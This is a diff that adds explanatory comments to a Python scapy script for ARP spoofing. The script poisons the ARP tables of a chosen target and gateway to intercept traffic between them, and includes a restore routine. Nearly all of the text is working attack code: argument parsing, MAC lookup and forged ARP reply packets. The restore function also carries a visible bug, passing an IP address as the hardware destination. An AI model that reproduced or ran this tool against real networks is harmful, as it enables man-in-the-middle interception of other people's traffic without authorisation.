@@ -4,6 +4,7 @@ import scapy.all as scapy
 import time
 import optparse
 
+#Get the user arguments for the target IP and gateway address
 def get_arguments():
     parser = optparse.OptionParser()
     parser.add_option("-t", "--target", dest="target", help="Target IP address to ARP poision")
@@ -17,6 +18,7 @@ def get_arguments():
         parser.error("[-] Please specify the gateways IP address. Use --help for more info.")
     return options
 
+#Get the MAC address for a specified IP address
 def get_mac(ip):
     #Create ARP packet
     arp_request = scapy.ARP(pdst=ip)
@@ -28,6 +30,7 @@ def get_mac(ip):
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
     return answered_list[0][1].hwsrc
 
+#Spoof a specified target IP and the gateway
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     #Construct the packet
@@ -39,6 +42,7 @@ def spoof(target_ip, spoof_ip):
     #Send the packet
     scapy.send(packet, verbose=False)
 
+#Restore the ARP table back to normal
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
@@ -46,11 +50,12 @@ def restore(destination_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_ip, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
 
-
+#Get the options and set them to target_ip and gateway_ip
 options = get_arguments()
 target_ip = options.target
 gateway_ip = options.gateway
 
+#Track the number of sent packets
 sent_packets_count = 0
 try:
     #ARP Poison the target
